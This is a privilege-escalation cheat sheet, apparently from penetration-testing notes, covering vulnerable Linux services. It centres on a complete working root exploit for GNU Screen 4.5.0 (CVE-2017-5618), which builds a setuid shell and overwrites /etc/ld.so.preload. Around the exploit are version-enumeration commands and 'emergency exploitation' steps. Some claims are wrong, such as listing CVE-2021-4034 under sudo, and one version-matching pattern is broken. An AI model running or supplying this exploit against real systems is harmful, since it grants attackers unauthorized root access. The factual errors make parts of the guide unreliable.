# ⚙️ Vulnerable Services

## 🎯 Overview

Installed services with known vulnerabilities can provide privilege escalation vectors. Version identification and exploit matching are key to discovering these opportunities.

## 📺 Screen Privilege Escalation (CVE-2017-5618)

### Vulnerability Details
- **Affected**: GNU Screen version 4.5.0
- **Impact**: Local privilege escalation to root
- **Method**: ld.so.preload file overwrite vulnerability

### Version Check
```bash
# Check Screen version
screen -v
# Vulnerable: Screen version 4.05.00 (GNU) 10-Dec-16
```

### Exploitation
```bash
# Download/create screen exploit
cat << 'EOF' > screen_exploit.sh
#!/bin/bash
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << 'LIBEOF' > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
LIBEOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << 'SHELLEOF' > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
SHELLEOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
echo "[+] Triggering..."
screen -ls
/tmp/rootshell
EOF

# Execute exploit
chmod +x screen_exploit.sh
./screen_exploit.sh
```

## 🔍 Service Enumeration

### Version Identification
```bash
# Common vulnerable services
apache2 -v
nginx -v
mysql --version
ssh -V
sudo -V

# Service status
systemctl list-units --type=service --state=running
ps aux | grep -E "(apache|nginx|mysql|screen)"
```

### Package Version Check
```bash
# Installed package versions
dpkg -l | grep -E "(screen|apache|nginx|mysql)"
rpm -qa | grep -E "(screen|apache|nginx|mysql)"  # RHEL/CentOS

# Specific package info
dpkg -l screen
apt show screen
```

## 🚨 Common Vulnerable Services

### Screen 4.5.0
- **CVE**: CVE-2017-5618
- **Exploit**: ld.so.preload overwrite
- **Impact**: Root shell

### Apache/Nginx
```bash
# Check for vulnerable modules
apache2 -M
nginx -T

# Look for known vulnerable versions
apache2 -v | grep -E "(2.2|2.4.0-2.4.29)"
```

### MySQL/MariaDB
```bash
# Version check for known CVEs
mysql --version | grep -E "(5.1|5.5|5.6)"

# User-defined functions (UDF) exploitation
# If MySQL runs as root
```

### SSH
```bash
# Check for vulnerable OpenSSH versions
ssh -V 2>&1 | grep -E "(OpenSSH_[1-7]\.|OpenSSH_8\.[0-3])"
```

## 🔧 Exploitation Framework

### Service Exploit Workflow
```bash
# 1. Service discovery
ps aux | grep root | grep -v "^\["

# 2. Version identification  
service_name -v
service_name --version

# 3. CVE research
searchsploit service_name
# Check ExploitDB, GitHub

# 4. Exploit adaptation
# Modify exploit for target environment

# 5. Execution
# Run exploit and verify escalation
```

### Quick Vulnerability Check
```bash
#!/bin/bash
echo "=== VULNERABLE SERVICES CHECK ==="

echo "[+] Screen version:"
screen -v 2>/dev/null

echo "[+] Apache version:"  
apache2 -v 2>/dev/null | head -1

echo "[+] Nginx version:"
nginx -v 2>&1

echo "[+] MySQL version:"
mysql --version 2>/dev/null

echo "[+] SSH version:"
ssh -V 2>&1 | head -1

echo "[+] Sudo version:"
sudo -V 2>/dev/null | head -1

echo "[+] Running services as root:"
ps aux | grep root | grep -E "(apache|nginx|mysql|screen|ssh)" | head -5
```

## 🎯 Exploitation Targets

### High-Impact Services
- **Screen 4.5.0** - Direct root exploit
- **Apache < 2.4.30** - Various module vulnerabilities
- **MySQL/MariaDB** - UDF exploitation if root
- **Sudo < 1.9.5** - Multiple CVEs available
- **OpenSSH** - Various authentication bypasses

### Service-Specific Exploits
```bash
# Screen 4.5.0
./screen_exploit.sh

# Sudo vulnerabilities  
# CVE-2021-4034, CVE-2021-3156, etc.

# Apache modules
# mod_rewrite, mod_ssl vulnerabilities

# Custom services
# Often have poor security practices
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Version checks for common vulnerabilities
screen -v | grep "4.05.00"  # Vulnerable to CVE-2017-5618
sudo -V | grep -E "1\.[0-8]\."  # Multiple CVEs

# Running root services
ps aux | grep "^root" | grep -v "^\[" | head -10
```

### Emergency Exploitation
```bash
# If Screen 4.5.0 found
./screen_exploit.sh  # Immediate root

# If vulnerable sudo found
# Check CVE-2021-4034, CVE-2021-3156 exploits

# Custom service analysis
strings /path/to/service | grep -i "password\|key"
ltrace /path/to/service
```

---

*Vulnerable services provide direct privilege escalation opportunities - outdated software versions combined with known exploits often result in immediate root access.* 